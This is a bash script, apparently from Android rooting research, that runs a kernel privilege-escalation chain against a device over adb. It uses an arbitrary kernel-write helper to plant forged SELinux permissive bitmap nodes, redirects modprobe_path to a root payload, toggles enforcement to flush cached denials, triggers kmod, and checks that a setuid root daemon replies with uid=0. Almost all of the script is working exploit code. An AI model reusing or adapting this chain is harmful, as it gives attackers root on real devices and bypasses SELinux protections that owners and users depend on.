#!/usr/bin/env bash
# Bootstrap the su daemon under ENFORCING -- v3.
#
# v2 worked but paid 120s for an AVC purge that the kernel gives us for free:
# selinuxfs.c:sel_write_enforce() calls avc_ss_reset(0) (=> avc_flush(), whole table)
# whenever the value flips TO enforcing, so planting the map first and then writing
# enforce=1 drains every stale cached deny in one step.
#
# Carried over from v2 (all three were measured failure causes in S133):
#   one trigger only (socktrig takes an argument), kill every sud pid (the daemon
#   double-forks and its fork-only children hold 12345/12346), and the exemption
#   bitmap is built from tools/_type_values.txt numbers, not an all-ones carpet.
#
# Denials are attributed by scontext AND filtered to the time window after the flip,
# because `grep -c permissive=0` over the whole dmesg ring counts history.
set -u
SER=${1:-3e5a38a5}
ADB="adb -s $SER"
D=/data/local/tmp
NODE_BASE=${NODE_BASE:-0xffffffc001635a78}
PERM_HEAD=${PERM_HEAD:-0xffffffc00189f4d0}
MODPROBE=0xffffffc001635a30
BITS=${EXEMPT:-164,241,494,627}          # kernel, qti_init_shell, init, untrusted_app
[ "${EXEMPT_SHELL:-0}" = 1 ] && BITS="$BITS,905"
NAMES="164=kernel 241=qti_init_shell 494=init 627=untrusted_app 905=shell"

$ADB get-state >/dev/null 2>&1 || { echo "ABORT: no adb"; exit 2; }
echo "  starting getenforce=$($ADB shell getenforce 2>/dev/null | tr -d '\r') (either is fine: step 1 forces 0->1, which is what drains the avc)"
$ADB forward tcp:12345 tcp:12345 >/dev/null 2>&1
run() { { printf '%s\n' "$1"; sleep "$2"; } | timeout $((40 + $2)) bash -c \
	'exec 3<>/dev/tcp/127.0.0.1/12345; cat >&3; cat <&3' 2>/dev/null | tr -d '\r'; }
run 'echo PRE-OK' 6 | grep -q PRE-OK || { echo "ABORT: channel not live"; exit 3; }

eval "$(NODE_BASE=$NODE_BASE HEAD_ADDR=$PERM_HEAD BITS=$BITS python3 - <<'PY'
import os, struct
base=int(os.environ["NODE_BASE"],16); head=int(os.environ["HEAD_ADDR"],16)
bits=sorted(int(x) for x in os.environ["BITS"].split(",") if x)
SZ=384
# Greedy windows, ascending startbit -- ebitmap_get_bit() walks
#   while (n && n->startbit <= bit) { if (n->startbit+SZ > bit) return node_get_bit(n,bit); n=n->next; }
# so a node's startbit need NOT be 64-aligned: any startbit <= bit < startbit+384 resolves.  That let
# {164,241,494} live in ONE node (startbit 164), which is also the discriminator for the failure mode
# found last run: a 128-byte blob wrote "PRIMITIVE WORKS" yet init(494) kept getting permissive=0
# denials, i.e. only the first node of the chain actually landed.  Each node is now emitted as its own
# NODE_HEX_n so the caller issues one clobber per node.
nodes=[]; i=0
while i < len(bits):
    s=bits[i]; grp=[b for b in bits[i:] if b-s < SZ]
    maps=[0]*6
    for b in grp:
        off=b-s; maps[off//64]|=1<<(off%64)
    i+=len(grp); nodes.append([0,maps,s,grp])
assert len(nodes) <= 4, "needs %d nodes; the modprobe_path tail holds 4" % len(nodes)
for n in range(len(nodes)-1):
    nodes[n][0]=base+64*(n+1)
def get_bit(e):
    if e > max(bits): return 0
    for nxt,maps,sbit,grp in nodes:
        if sbit > e: break
        if sbit + SZ > e:
            off=e-sbit; return (maps[off//64]>>(off%64))&1
    return 0
for b in bits: assert get_bit(b)==1, b
for b in (300 if 300 in bits else 301, 700, 1000, 1151): assert get_bit(b)==0, b
out=[]
for n,(nxt,maps,sbit,grp) in enumerate(nodes):
    rec=struct.pack("<Q",nxt)+b"".join(struct.pack("<Q",m) for m in maps)+struct.pack("<I",sbit)
    assert len(rec)==60; rec+=b"\0"*4
    assert len(rec)==64
    out.append("NODE_HEX_%d=%s"%(n,rec.hex()))
    out.append("NODE_ADDR_%d=%s"%(n,hex(base+64*n)))
    out.append("NODE_BITS_%d=%s"%(n,"_".join(str(b) for b in grp)))
headb=struct.pack("<Q",base)+struct.pack("<I",max(bits))+struct.pack("<I",0)
assert len(headb)==16
out.append("HEAD_HEX="+headb.hex())
out.append("MAPINFO=nodes=%d_highbit=%d_bits=%s"%(len(nodes),max(bits),"_".join(str(b) for b in bits)))
print(";".join(out))
PY
)"
[ -n "${NODE_HEX_0:-}" ] || { echo "ABORT: payload generation failed"; exit 4; }
echo "  $MAPINFO  (local ebitmap_get_bit model: every listed bit ->1, controls 300/700/1000/1151 ->0)"
NODE_CMDS=""
n=0
while [ -n "$(eval echo \"\${NODE_BITS_$n:-}\")" ]; do
	addr=$(eval echo "\$NODE_ADDR_$n")
	hex=$(eval echo "\$NODE_HEX_$n")
	NODE_CMDS="$NODE_CMDS /data/local/tmp/clobber 14 kern $addr hex:$hex | grep -c 'PRIMITIVE WORKS';"
	echo "    node$n addr=$addr bits=$(eval echo \"\$NODE_BITS_$n\")"
	n=$((n + 1))
done

echo "=== 1. write the wrapper payload, plant map, point modprobe at it, flip (the flip drains the avc)"
# The payload -- not the test -- clears the ports: kmod execs sudK, sudK kills every sud* (including the
# daemon that still holds 12345/12346), then execs the real daemon.  Doing it here is what makes the
# measurement independent of which build served my channel: a sh spawned by an old (non-CLOEXEC) daemon
# keeps holding the listener fds, so the test could never free the ports itself after its own daemon died.
$ADB push /home/v/.local/project/xplay6/xplay6-tmproot/tools/sudK.sh $D/sudK >/dev/null 2>&1 \
	|| { echo "ABORT: push sudK.sh"; exit 4; }
run "cp $D/sudD $D/sudC; chmod 755 $D/sudC; chcon u:object_r:shell_data_file:s0 $D/sudC; \
	chmod 755 $D/sudK; chcon u:object_r:shell_data_file:s0 $D/sudK; head -1 $D/sudK; \
	rm -rf $D/np; mkdir -p $D/np; chcon u:object_r:radio_data_file:s0 $D/np; touch $D/np/f; chmod 777 $D/np $D/np/f; \
	rm -f $D/sud.stage $D/sudK.out; echo -n 'NODE-COUNTS: '; $NODE_CMDS echo -n 'HEAD-COUNT: '; \
	/data/local/tmp/clobber 14 kern $PERM_HEAD hex:$HEAD_HEX | grep -c 'PRIMITIVE WORKS'; echo STAGE-CLEARED" 45 | tr '\n' ' ' | sed 's/^/  /'
echo
run "/data/local/tmp/clobber 14 kern $MODPROBE str:$D/sudK 4 0 | grep -c 'PRIMITIVE WORKS'; cat /proc/sys/kernel/modprobe; \
	echo 0 > /sys/fs/selinux/enforce; echo 1 > /sys/fs/selinux/enforce; cat /proc/uptime; getenforce; id -Z" 30 | tr '\n' '|' | sed 's/^/  modprobe-ok|path|uptime|enforce|domain: /'
UP=$(run 'cat /proc/uptime' 8 | grep -oE '^[0-9]+' | head -1)
case "$UP" in ''|*[!0-9]*) echo "  WARN: flip timestamp unreadable (UP='$UP') -> denial counting falls back to the whole ring"; UP=0;; esac
echo "  flip timestamp (dmesg seconds) = $UP"

echo "=== 2. exactly one file-less trigger, from the exempt daemon shell (this connection dies with its daemon)"
run 'echo BEFORE-TRIG; /data/local/tmp/socktrig once; echo TRIG-SENT; sleep 10; dmesg > /data/local/tmp/dm.now 2>&1; echo DUMPED; id -Z' 40 \
	| tee /home/v/.local/project/xplay6/.quiet/killtrig.txt | sed 's/^/  /'
grep -q "TRIG-SENT" /home/v/.local/project/xplay6/.quiet/killtrig.txt \
	|| echo "  NOTE: no TRIG-SENT echo came back -- expected if the payload killed the daemon before the echo could run."
sleep 6

echo "=== 4. verdict (needs Enforcing + listener + root reply + no denial against an exempt domain)"
L=$($ADB shell 'netstat -ltn 2>/dev/null | grep -cE ":1234[56]"' 2>/dev/null | tr -d '\r')
G=$($ADB shell 'getenforce' 2>/dev/null | tr -d '\r')
echo "  getenforce=$G listeners=$L"
echo "  stage=$($ADB shell 'cat /data/local/tmp/sud.stage 2>&1 | tail -3' 2>/dev/null | tr -d '\r' | tr '\n' '|')"
echo "  sudK.out=$($ADB shell cat /data/local/tmp/sudK.out 2>/dev/null | tr -d '\r' | tr '\n' '|')"
R=$(timeout 30 $ADB shell '/data/local/tmp/sux -c id 2>&1' 2>/dev/null | tr -d '\r' | head -1)
echo "  suid reply=$R"
$ADB shell "cat /data/local/tmp/dm.now" 2>/dev/null | tr -d '\r' | python3 -c '
import sys,re
try: up=float(sys.argv[1])
except Exception: up=0.0
exempt={"kernel","qti_init_shell","init","untrusted_app"}
rows=[]
for ln in sys.stdin:
    m=re.match(r"\[\s*(\d+\.\d+)\]",ln)
    if not m: continue
    if float(m.group(1)) < up: continue
    if "permissive=0" not in ln: continue
    s=re.search(r"scontext=u:r:([a-z0-9_]+)",ln)
    rows.append(s.group(1) if s else "?")
from collections import Counter
c=Counter(rows)
print("  denials(permissive=0) after the flip, by scontext:", dict(c) or "none")
print("  exempt domains still denied:", sorted(n for n in c if n in exempt) or "none")
' "$UP"
N=$($ADB shell "stat $D/np/f 2>&1" 2>/dev/null | tr -d '\r' | head -1)
case "$N" in *denied*|*Permission*) echo "  confined adb-shell on radio_data_file: REFUSED => Enforcing binds non-exempt domains";; *) echo "  confined adb-shell: ALLOWED => no live control (shell is in the exempt set or DAC covered)";; esac
case "$G-$L" in
  Enforcing-[1-9]*) case "$R" in *uid=0*) echo "  RESULT: PASS -- daemon restarted by kmod under Enforcing and granted root";; *) echo "  RESULT: listener up but suid channel did not answer ($R)";; esac;;
  *) echo "  RESULT: FAIL -- getenforce=$G listeners=$L (no 'start pid=' in stage => exec never ran; errno=98 => port still held)";;
esac

echo "=== 5. restore"
if [ "${RESTORE:-1}" = 0 ]; then
	echo "  SKIPPED (RESTORE=0): leaving the device in Enforcing + narrow map for the next probe"
	exit 0
fi
timeout 30 $ADB shell am startservice -n com.xplay6.temproot/.EscService >/dev/null 2>&1
i=0; while [ $i -lt 20 ]; do sleep 5; i=$((i+1)); G=$($ADB shell getenforce 2>/dev/null | tr -d '\r'); [ "$G" = Permissive ] && break; done
echo "  after restore: $G ($((i*5))s)   [exempt-set names for reading: $NAMES]"
